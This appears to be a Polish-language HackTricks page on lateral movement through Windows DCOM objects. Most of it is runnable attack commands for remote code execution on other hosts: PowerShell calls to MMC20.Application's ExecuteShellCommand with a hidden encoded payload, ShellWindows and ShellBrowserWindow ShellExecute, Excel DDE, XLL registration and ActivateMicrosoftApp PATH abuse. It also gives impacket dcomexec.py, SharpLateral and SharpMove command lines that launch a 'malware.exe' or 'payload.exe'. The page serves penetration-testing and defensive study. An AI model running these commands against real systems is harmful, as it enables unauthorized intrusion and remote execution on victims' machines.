# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement jest atrakcyjny, ponieważ ponownie wykorzystuje istniejące serwery COM wystawione przez RPC/DCOM zamiast tworzyć usługę lub zadanie harmonogramu. W praktyce oznacza to, że początkowe połączenie zwykle zaczyna się na TCP/135, a następnie przechodzi na dynamicznie przydzielane wysokie porty RPC.

## Wymagania wstępne i pułapki

- Zwykle potrzebujesz lokalnego kontekstu administratora na celu, a zdalny serwer COM musi zezwalać na remote launch/activation.
- Od **14 marca 2023**, Microsoft wymusza DCOM hardening dla obsługiwanych systemów. Stare klienty, które żądają niskiego poziomu uwierzytelniania aktywacji, mogą zawieść, chyba że uzgodnią co najmniej `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Nowoczesne klienty Windows są zwykle automatycznie podnoszone, więc obecne narzędzia zazwyczaj nadal działają.
- Ręczne lub skryptowe wykonywanie DCOM zazwyczaj wymaga TCP/135 oraz zakresu dynamicznych portów RPC celu. Jeśli używasz `dcomexec.py` z Impacket i chcesz otrzymać wynik polecenia, zwykle potrzebujesz także dostępu SMB do `ADMIN$` (lub innego udziału z prawem zapisu/czytu).
- Jeśli RPC/DCOM działa, ale SMB jest zablokowane, `dcomexec.py -nooutput` nadal może być przydatne do blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Więcej informacji o tej technice znajdziesz w oryginalnym poście [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Obiekty Distributed Component Object Model (DCOM) zapewniają interesującą możliwość interakcji z obiektami przez sieć. Microsoft udostępnia obszerną dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Listę aplikacji DCOM można pobrać za pomocą polecenia PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Obiekt COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), umożliwia skryptowanie operacji snap-in MMC. Co istotne, ten obiekt zawiera metodę `ExecuteShellCommand` w `Document.ActiveView`. Więcej informacji o tej metodzie można znaleźć [tutaj](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Sprawdź, jak to działa:

Ta funkcja ułatwia wykonywanie poleceń przez sieć za pomocą aplikacji DCOM. Aby zdalnie interagować z DCOM jako admin, można użyć PowerShell w następujący sposób:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Następnie można wywołać metodę ExecuteShellCommand, aby uruchomić proces na zdalnym hoście. Proces obejmuje następujące kroki:

Sprawdź metody:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Uzyskaj RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Ostatni argument to styl okna. `7` utrzymuje okno zminimalizowane. Operacyjnie wykonanie oparte na MMC zwykle powoduje, że zdalny proces `mmc.exe` uruchamia Twój payload, co różni się od obiektów opartych o Explorer poniżej.

## ShellWindows & ShellBrowserWindow

**Więcej informacji o tej technice znajdziesz w oryginalnym poście [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Obiekt **MMC20.Application** został zidentyfikowany jako pozbawiony jawnych "LaunchPermissions", domyślnie korzystający z uprawnień zezwalających na dostęp Administratorom. Po więcej szczegółów można przejrzeć wątek [here](https://twitter.com/tiraniddo/status/817532039771525120), a zalecane jest użycie [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET do filtrowania obiektów bez jawnego Launch Permission.

Dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, zostały wyróżnione ze względu na brak jawnych Launch Permissions. Brak wpisu `LaunchPermission` w rejestrze pod `HKCR:\AppID\{guid}` oznacza brak jawnych uprawnień.

W porównaniu z `MMC20.Application`, te obiekty są często cichsze z perspektywy OPSEC, ponieważ polecenie zwykle kończy jako proces potomny `explorer.exe` na zdalnym hoście zamiast `mmc.exe`.

### ShellWindows

W przypadku `ShellWindows`, które nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` umożliwiają utworzenie obiektu przy użyciu jego AppID. Ten proces wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po utworzeniu obiektu możliwa jest interakcja przez metodę `WindowsShell.Item`, co prowadzi do wywołania metody, takiej jak `Document.Application.ShellExecute`.

Przykładowe polecenia PowerShell zostały podane do utworzenia obiektu i zdalnego wykonania poleceń:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` jest podobny, ale możesz go zainicjować bezpośrednio przez jego CLSID i pivotować do `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Ruch boczny z obiektami Excel DCOM

Ruch boczny można osiągnąć, wykorzystując obiekty DCOM Excel. Aby uzyskać szczegółowe informacje, zaleca się przeczytanie dyskusji o wykorzystaniu Excel DDE do ruchu bocznego przez DCOM na [blogu Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Projekt Empire udostępnia skrypt PowerShell, który demonstruje użycie Excel do zdalnego wykonania kodu (RCE) przez manipulację obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępnego w [repozytorium GitHub projektu Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), pokazujące różne metody nadużywania Excel do RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Najnowsze badania rozszerzyły ten obszar o metodę `ActivateMicrosoftApp()` w `Excel.Application`. Główna idea polega na tym, że Excel może próbować uruchomić starsze aplikacje Microsoft, takie jak FoxPro, Schedule Plus lub Project, wyszukując je w systemowym `PATH`. Jeśli operator może umieścić payload o jednej z tych oczekiwanych nazw w zapisywalnej lokalizacji, która jest częścią `PATH` celu, Excel go wykona.

Wymagania dla tej odmiany:

- Local admin na celu
- Excel zainstalowany na celu
- Możliwość zapisania payloadu do katalogu, który jest zapisywalny i znajduje się w `PATH` celu

Praktyczny przykład nadużycia wyszukiwania FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Jeśli host atakujący nie ma zarejestrowanego lokalnie ProgID `Excel.Application`, utwórz zdalny obiekt zamiast tego przez CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Wartości widziane nadużywane w praktyce:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Narzędzia automatyzujące do lateral movement

Dwa narzędzia są wyróżnione do automatyzacji tych technik:

- **Invoke-DCOM.ps1**: Skrypt PowerShell dostarczony przez projekt Empire, który upraszcza wywoływanie różnych metod wykonywania kodu na zdalnych maszynach. Ten skrypt jest dostępny w repozytorium Empire na GitHub.

- **SharpLateral**: Narzędzie zaprojektowane do zdalnego wykonywania kodu, którego można użyć z poleceniem:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatyczne narzędzia

- Skrypt Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) umożliwia łatwe wywołanie wszystkich opisanych sposobów wykonywania kodu na innych maszynach.
- Możesz użyć `dcomexec.py` z Impacket do wykonywania poleceń na systemach zdalnych za pomocą DCOM. Obecne wersje obsługują `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a domyślnie używają `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Możesz także użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Możesz także użyć [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referencje

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
